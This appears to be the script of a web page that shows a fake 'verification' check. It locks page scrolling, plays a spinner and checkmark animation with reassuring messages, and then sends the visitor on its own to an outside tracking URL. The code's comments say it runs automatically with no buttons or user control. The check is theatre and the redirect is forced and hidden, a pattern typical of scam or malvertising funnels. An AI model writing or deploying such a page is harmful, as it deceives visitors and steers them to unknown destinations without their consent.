
<script>
(function(){
  const bd = document.body;
  // Prevent any interaction with the page behind the modal
  document.documentElement.style.overflow = 'hidden';

  function autoVerification(){
    const card    = bd.querySelector('#verify-card');
    const helper  = bd.querySelector('#verify-helper');
    const sub     = bd.querySelector('#verify-sub');
    const box     = bd.querySelector('.checkbox');
    const spinner = bd.querySelector('.spinner');

    // Initial idle state (already rendered)
    helper.textContent = 'Preparing verification…';
    sub.textContent = 'waiting…';

    // Start spinner after a short delay
    setTimeout(() => {
      spinner.style.display = 'block';
      helper.textContent = 'Please wait while we complete a quick check.';
      sub.textContent = 'in progress…';

      // After 5s from start of spinner: finish + redirect
      setTimeout(() => {
        spinner.style.display = 'none';
        box.classList.add('checked');
        sub.textContent = 'Done';
        helper.textContent = 'Redirecting…';

        // Small grace period for the checkmark animation
        setTimeout(() => { window.location.href = 'http://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
      }, 5000);
    }, 300); // "few milliseconds" before starting the spinner
  }

  // Start automatically; no buttons or user control
  autoVerification();
})();
</script>